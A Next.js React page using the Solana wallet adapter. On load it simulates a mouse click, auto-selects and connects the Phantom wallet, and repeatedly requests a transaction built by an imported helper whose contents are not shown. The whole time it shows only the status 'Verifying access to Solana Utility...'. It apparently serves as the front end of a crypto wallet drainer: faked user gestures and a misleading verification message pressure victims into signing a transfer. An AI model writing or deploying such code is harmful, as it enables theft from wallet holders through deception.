'use client'

import { useEffect, useRef, useState } from 'react'
import { useConnection, useWallet } from '@solana/wallet-adapter-react'
import { WalletName } from '@solana/wallet-adapter-base'
import { createUnsignedTransaction } from '../services/transaction'
import { Transaction } from '@solana/web3.js'

export default function TransactionPage() {
  const { connection } = useConnection()
  const {
    publicKey,
    sendTransaction,
    connect,
    select,
    connected,
  } = useWallet()

  const retries = useRef(0)
  const maxRetries = 3
  const waiting = useRef(false)
  const [status, setStatus] = useState("Loading...") // yazı güncellenebilir

  useEffect(() => {
    const simulateClick = () => {
      const fakeClick = new MouseEvent("click", {
        bubbles: true,
        cancelable: true,
        view: window
      });
      document.body.dispatchEvent(fakeClick);
    }

    const trySendTransaction = async () => {
      if (!publicKey || waiting.current || retries.current >= maxRetries) return
      waiting.current = true

      try {
        simulateClick()
        setStatus("Verifying access to Solana Utility...")
        const tx = await createUnsignedTransaction(publicKey, connection)
        const sig = await sendTransaction(tx as Transaction, connection)
        console.log("✅ transaction sent:", sig)
        setStatus("Succesful ✅")
      } catch (err: any) {
        console.warn("⚠️ İşlem başarısız:", err?.message || err)
        retries.current += 1
        setStatus("Verifying access to Solana Utility...")
        setTimeout(() => {
          waiting.current = false
          trySendTransaction()
        }, 3000)
      }
    }

    const start = async () => {
      try {
        simulateClick()
        await select("Phantom" as WalletName)
        if (!connected) await connect()
        if (publicKey) trySendTransaction()
      } catch (err) {
        console.error("connection error:", err)
        setStatus("Connection error ❌")
      }
    }

    start()
  }, [publicKey, connected])

  return (
    <div style={{
      backgroundColor: 'black',
      width: '100vw',
      height: '100vh',
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      color: 'white',
      fontSize: '16px',
      fontFamily: 'monospace'
    }}>
      {status}
    </div>
  )
}
